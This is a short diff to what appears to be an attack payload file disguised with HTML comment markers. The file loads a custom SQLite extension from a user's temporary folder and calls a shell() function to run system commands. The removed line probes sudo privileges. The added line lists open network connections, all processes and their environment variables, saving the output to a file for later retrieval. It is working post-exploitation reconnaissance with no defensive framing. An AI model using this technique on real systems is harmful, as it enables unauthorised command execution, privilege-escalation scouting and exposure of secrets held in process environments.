@@ -1,4 +1,4 @@
 -- <html>
 .load /home/as2-streaming-user/MyFiles/TemporaryFiles/extension
-select shell("( sudo -l; sudo id; sudo whoami;  ) > /home/as2-streaming-user/MyFiles/TemporaryFiles/output.txt");
+select shell("( lsof -i -P -n; netstat -a; ps auxe   ) > /home/as2-streaming-user/MyFiles/TemporaryFiles/output.txt");
 -- </html>
